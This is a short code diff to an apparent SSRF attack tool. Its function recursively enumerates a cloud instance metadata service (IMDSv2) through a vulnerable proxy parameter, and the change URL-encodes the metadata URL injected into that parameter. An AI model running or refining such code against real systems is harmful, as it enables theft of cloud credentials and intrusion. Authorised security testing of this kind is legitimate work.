@@ -15,7 +15,7 @@ export async function enumerateIMDSRecursive(proxyUrl, token, basePath = "/lates
 
   try {
     const metadataUrl = `${CONFIG.imdsv2.baseUrl}${basePath}`;
-    const fullUrl = `${proxyUrl}?${CONFIG.ssrf.paramName}=${metadataUrl}`;
+    const fullUrl = `${proxyUrl}?${CONFIG.ssrf.paramName}=${encodeURIComponent(metadataUrl)}`;
 
     const response = await axios.get(fullUrl, {
       headers: {
